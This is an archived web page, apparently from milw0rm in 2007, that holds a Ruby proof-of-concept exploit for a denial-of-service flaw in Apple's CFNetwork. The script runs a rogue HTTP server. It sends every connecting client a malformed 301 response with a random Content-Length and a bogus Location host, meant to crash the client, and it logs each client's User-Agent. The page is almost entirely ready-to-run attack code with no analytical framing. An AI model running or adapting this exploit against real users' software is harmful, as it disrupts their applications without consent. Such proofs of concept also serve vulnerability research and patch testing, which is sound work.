<html><head><title>Apple CFNetwork HTTP Response Denial of Service Exploit (rb code)</title></head><pre>#!/usr/bin/ruby
# (c) Copyright 2007 Lance M. Havok &lt;lmh [at] info-pull.com&gt;
# Proof of concept for MOAB-25-01-2007.
#

require 'socket'

web_port = (ARGV[0] || 80).to_i

puts &quot;++ Starting HTTP server at port #{web_port}.&quot;
web_server  = TCPServer.new(nil, web_port)
while (session = web_server.accept)
  rand_clen = rand(80)
  useragent = session.recvfrom(2000)[0].scan(/User-Agent: (.*)/).flatten[0].chomp!
  puts &quot;++ Connected: #{useragent}&quot;
  session.print &quot;HTTP/1.1 301 OK\r\n&quot;
  session.print &quot;Content-Type: text/html\r\n&quot;
  session.print &quot;Content-Length: #{rand_clen}\r\n&quot;
  session.print &quot;Location: http://nonexistent123\r\n\r\n&quot;
  session.print &quot;X&quot; * rand_clen
  session.close
end

# milw0rm.com [2007-01-25]</pre></html>